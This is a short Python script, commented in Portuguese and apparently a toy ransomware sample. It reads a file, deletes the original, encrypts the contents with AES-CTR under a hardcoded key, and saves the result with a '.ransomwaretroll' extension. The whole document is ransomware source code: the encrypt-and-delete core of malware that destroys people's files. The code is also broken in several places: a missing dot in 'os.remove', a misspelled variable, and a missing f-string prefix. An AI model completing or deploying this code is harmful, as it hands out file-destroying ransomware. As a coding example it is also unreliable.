import os
import pyaes

## abrir o arquivo que será criptografado

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

## remover o arquivo original

osremove(file_name)

## definindo a chave da encriptação

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografando o arquivo

crypto_data = aes.encrypt(file_data)

## salvando o arquivo criptografado

new_file = file_name + '.ransomwaretroll'
new_file = open('{new_file}', 'wb')
new_file.write(cryto_data)
new_file.close()
